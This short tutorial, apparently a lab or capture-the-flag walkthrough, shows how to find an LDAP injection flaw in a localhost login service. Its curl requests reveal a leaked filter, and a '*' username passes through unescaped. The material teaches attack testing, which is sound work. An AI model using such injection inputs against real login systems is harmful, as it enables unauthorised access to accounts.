# Finding the Bug

Try a login with the wrong password first:

```
curl -X POST http://localhost:8080/login \
  -d "username=admin&password=wrongpassword"
```

```json
{
  "success": false,
  "error": "Invalid credentials",
  "filter_used": "(&(uid=admin)(userPassword=wrongpassword))"
}
```

The response leaks the LDAP filter that was constructed. That is the vulnerability disclosure you need. The filter is built by string interpolation. The username and password appear verbatim inside the filter.

Notice the LDAP special characters: `(`, `)`, `*`, `&`. If you can include those in your username, you can change what the filter means.

Try a wildcard to confirm input is not escaped:

```
curl -X POST http://localhost:8080/login \
  -d "username=*&password=anything"
```

```json
{
  "filter_used": "(&(uid=*)(userPassword=anything))",
  ...
}
```

The `*` passed through unescaped. The filter structure is under your control.
